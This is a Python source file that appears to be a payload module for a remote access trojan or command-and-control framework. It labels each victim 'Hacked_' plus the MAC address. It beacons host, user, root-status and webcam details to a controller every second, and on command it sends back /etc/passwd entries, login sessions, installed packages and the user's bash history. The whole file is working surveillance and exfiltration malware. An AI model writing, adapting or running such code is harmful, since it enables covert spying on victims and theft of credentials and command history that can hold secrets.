import sys

sys.path.append('../../../')
from lib.tool import EZData

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import socket
import getpass
import platform
import uuid
import os
import subprocess
import time
import json
import threading
import shutil
from typing import List
from dataclasses import dataclass

g_Info = None
g_thread = None

class Info:
    def __init__(self):
        self.szID = f'Hacked_{uuid.getnode()}'
        self.szHostname = socket.gethostname()
        self.szIP = socket.gethostbyname(socket.gethostname())
        self.szUsername = getpass.getuser()
        self.szOSversion = platform.platform()
        self.szUid = str(os.getuid())
        self.bAdmin = self.szUid == '0'

        self.nSendInfoInterval = 1 # second.

    @dataclass
    class UserInfo:
        username = ''
        uid = ''
        gid = ''
        full_name = ''
        home_dir = ''
        shell = ''

    @dataclass
    class Session:
        username = ''
        terminal = ''
        login_time = ''
        source = ''

    @dataclass
    class InstalledApp:
        name: str
        version: str
        source: str
        description: str = "N/A"
        size: str = "N/A"
        architecture: str = "N/A"
        license: str = "N/A"

    @dataclass
    class InstalledApp:
        name: str
        version: str
        source: str
        install_path: str = "N/A"
        description: str = "N/A"
        size: str = "N/A"
        architecture: str = "N/A"
        license: str = "N/A"

    class InstalledAppsManager:
        def __init__(self):
            self.installed_apps = []

        @staticmethod
        def is_command_available(command: str) -> bool:
            return shutil.which(command) is not None

        def get_installed_apps_dpkg(self) -> List["Info.InstalledApp"]:
            if not self.is_command_available('dpkg'):
                #print("dpkg command is not available, skipping...")
                return []

            result = subprocess.run(['dpkg', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            installed_apps = []
            for line in result.stdout.splitlines():
                if line.startswith("ii"):
                    parts = line.split()
                    name = parts[1]
                    version = parts[2]

                    install_path_result = subprocess.run(['dpkg-query', '-L', name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    install_path = install_path_result.stdout.strip().splitlines()[0] if install_path_result.stdout else "N/A"

                    installed_apps.append(Info.InstalledApp(name=name, version=version, source="dpkg", install_path=install_path))

            return installed_apps

        def get_installed_apps_rpm(self) -> List["Info.InstalledApp"]:
            if not self.is_command_available('rpm'):
                #print("rpm command is not available, skipping...")
                return []

            result = subprocess.run(['rpm', '-qa'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            installed_apps = []
            for line in result.stdout.splitlines():
                name = line

                install_path_result = subprocess.run(['rpm', '-ql', name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                install_path = install_path_result.stdout.strip().splitlines()[0] if install_path_result.stdout else "N/A"

                installed_apps.append(Info.InstalledApp(name=name, version="N/A", source="rpm", install_path=install_path))

            return installed_apps

        def get_installed_apps_snap(self) -> List["Info.InstalledApp"]:
            if not self.is_command_available('snap'):
                #print("snap command is not available, skipping...")
                return []

            result = subprocess.run(['snap', 'list'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            installed_apps = []
            for line in result.stdout.splitlines()[1:]:
                parts = line.split()
                name = parts[0]
                version = parts[1]

                install_path = f"/var/lib/snapd/snaps/{name}.snap"

                installed_apps.append(Info.InstalledApp(name=name, version=version, source="snap", install_path=install_path))

            return installed_apps

        def get_installed_apps_flatpak(self) -> List["Info.InstalledApp"]:
            if not self.is_command_available('flatpak'):
                #print("flatpak command is not available, skipping...")
                return []

            result = subprocess.run(['flatpak', 'list'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            installed_apps = []
            for line in result.stdout.splitlines()[1:]:
                parts = line.split()
                name = parts[0]
                version = parts[1]

                install_path = f"/var/lib/flatpak/{name}"

                installed_apps.append(Info.InstalledApp(name=name, version=version, source="flatpak", install_path=install_path))

            return installed_apps

        def get_all_installed_apps(self) -> List["Info.InstalledApp"]:
            self.installed_apps = []
            for method in [
                self.get_installed_apps_dpkg,
                self.get_installed_apps_rpm,
                self.get_installed_apps_snap,
                self.get_installed_apps_flatpak
            ]:
                apps = method()
                if apps:
                    self.installed_apps.extend(apps)

            return self.installed_apps
                                          
    def get_cpu_usage(self) -> int:
        try:
            def read_cpu_times() -> tuple[str, str]:
                with open('/proc/stat', 'r') as f:
                    cpu_line = f.readline()
                
                values = list(map(int, cpu_line.split()[1:]))
                total = sum(values)
                idle = values[3]

                return total, idle

            total1, idle1 = read_cpu_times()
            time.sleep(0.1) 
            total2, idle2 = read_cpu_times()

            total_delta = total2 - total1
            idle_delta = idle2 - idle1

            usage = 100 * (1 - idle_delta / total_delta) if total_delta else 0
            
            return round(usage, 2)
        except:
            return -1
    
    def exists_monitor(self) -> bool:
        return 'DISPLAY' in os.environ or 'WAYLAND_DISPLAY' in os.environ
    
    def exists_webcam(self) -> bool:
        for i in range(5): # Check up to /dev/video4
            if os.path.exists(f"/dev/video{i}"):
                return True
        return False

    def get_info(self) -> dict:
        dic_info = {
            'ID': self.szID,
            'IP': self.szIP,
            'Hostname': self.szHostname,
            'Username': self.szUsername,
            'OS': self.szOSversion,
            'uid': self.szUid,
            'admin': self.bAdmin,
            'Monitor': self.exists_monitor(),
            'Webcam': self.exists_webcam(),
            'CPU': f'{self.get_cpu_usage()} %'
        }

        return dic_info

    def send_info(self, clnt: object):
        while True:
            info = self.get_info()
            json_str = json.dumps(info)

            ls_send = [
                '*', # boardcast
                'info',
                'start',
                json_str,
            ]

            clnt.sendserver(ls_send)

            time.sleep(self.nSendInfoInterval)

    def get_details(self) -> list:
        ls = [

            # Basic information.
            self.get_info(),

            # System information.
            {
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
            },

            # Client informaiton.
            {
                'Send infor interval': self.nSendInfoInterval,
                'Loaded class': ','.join([x for x in self.clnt.dic_class.keys()])
            },
        ]

        return ls

    def get_last_logins(self):
        result = subprocess.run(['last'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout
    
    def get_current_sessions(self) -> list:
        result = subprocess.run(['who'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        sessions = result.stdout.strip().splitlines()
        
        session_list = []

        for session in sessions:
            parts = session.split()

            session = Info.Session()
            session.username = parts[0]
            session.terminal = parts[1]
            session.login_time = parts[2] + ' ' + parts[3]
            session.source = parts[4] if len(parts) > 4 else 'N/A'
            
            session_list.append(session)

        return session_list

    def get_users(self) -> list:
        ls = []
        with open('/etc/passwd', 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                userInfo = Info.UserInfo()
                userInfo.username = parts[0]
                userInfo.uid = parts[2]
                userInfo.gid = parts[3]
                userInfo.full_name = parts[4]
                userInfo.home_dir = parts[5]
                userInfo.shell = parts[6]

                ls.append(userInfo)

        return ls
    
    def get_bash_history(self) -> list:
        history_file = os.path.expanduser('~/.bash_history')
        ls = []
        with open(history_file, 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    ls.append(line.strip())

        return ls

    def run(self, clnt: object, szToken: str, aMsg: list) -> list:
        global g_Info
        global g_thread

        try:
            if aMsg[0] == 'start':
                if g_thread != None or g_Info != None:
                    return None
                
                self.clnt = clnt

                g_thread = threading.Thread(target=self.send_info, args=[clnt, ])
                g_thread.daemon = True
                g_thread.start()
            
                return None
            elif aMsg[0] == 'interval':
                if aMsg[1] == 'set':
                    nInterval = int(aMsg[3]) # seconds.
                    g_Info.nSendInfoInterval = nInterval
                    self.nSendInfoInterval = nInterval

            elif aMsg[0] == 'details':

                ls_msg = [
                    'info',
                    'details',
                    EZData.lsDic2Str(self.get_details()),
                ]

                return ls_msg
            elif aMsg[0] == 'user':
                lsUser = []
                for user in self.get_users():
                    assert isinstance(user, Info.UserInfo)
                    lsUser.append([
                        user.username,
                        user.uid,
                        user.gid,
                        user.full_name,
                        user.home_dir,
                        user.shell,
                    ])
                
                return [
                    'info',
                    'user',
                    EZData.twoDlist2str(lsUser),
                ]
            
            elif aMsg[0] == 'session':
                lsSession = []
                for session in self.get_current_sessions():
                    assert isinstance(session, Info.Session)
                    lsSession.append([
                        session.username,
                        session.terminal,
                        session.login_time,
                        session.source,
                    ])
                
                return [
                    'info',
                    'session',
                    EZData.twoDlist2str(lsSession),
                ]

            elif aMsg[0] == 'app':
                lsApp = []
                app = Info.InstalledAppsManager()
                for app in app.get_all_installed_apps():
                    assert isinstance(app, Info.InstalledApp)

                    lsApp.append([
                        app.name,
                        app.version,
                        app.source,
                        app.install_path,
                        app.description,
                        app.size,
                        app.architecture,
                        app.license,
                    ])

                return [
                    'info',
                    'app',
                    EZData.twoDlist2str(lsApp),
                ]
            elif aMsg[0] == 'bash':
                try:
                    ls = self.get_bash_history()
                    return [
                        'info',
                        'bash',
                        '1',
                        EZData.list2str(ls, ';'),
                    ]
                except Exception as ex:
                    return [
                        'info',
                        'bash',
                        '0',
                        str(ex),
                    ]
            elif aMsg[0] == 'stop':
                g_Info = g_thread = None
                return [
                    'stop',
                    '1',
                ]
            
        except Exception as ex:
            print(ex)

if __name__ == '__main__':
    inf = Info()
    ls = inf.get_bash_history()
    print(EZData.list2str(ls, ';'))